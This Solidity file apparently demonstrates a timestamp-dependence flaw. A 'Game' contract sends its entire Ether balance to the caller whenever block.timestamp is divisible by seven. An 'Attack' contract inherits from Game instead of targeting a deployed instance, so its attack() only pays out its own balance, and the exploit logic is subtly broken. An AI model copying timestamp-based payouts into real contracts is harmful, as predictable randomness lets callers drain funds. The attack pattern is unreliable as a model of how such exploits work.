// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Game {

    event MessageLogged(string message);

    constructor() payable {}

    function randomizeWinner() internal {
         if(block.timestamp % 7 == 0) {         
          (bool sent, ) = msg.sender.call{value: address(this).balance}("");         
          require(sent, "Failed to send Ether");     
        }else {
            emit MessageLogged("wrong guess. try again.");

        }
    }
}

contract Attack is Game {
    //this is a function that allows for recieving ether
    receive() external payable {}

    //function to send attack 
    function attack() public returns (uint256, uint256){
        uint256 beforeAttack = getCurrentTimestamp();
        randomizeWinner();
        uint256 afterAttack = getCurrentTimestamp();
        return (beforeAttack, afterAttack);
    }

    function getCurrentTimestamp() public view returns (uint256) {
        return block.timestamp;
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
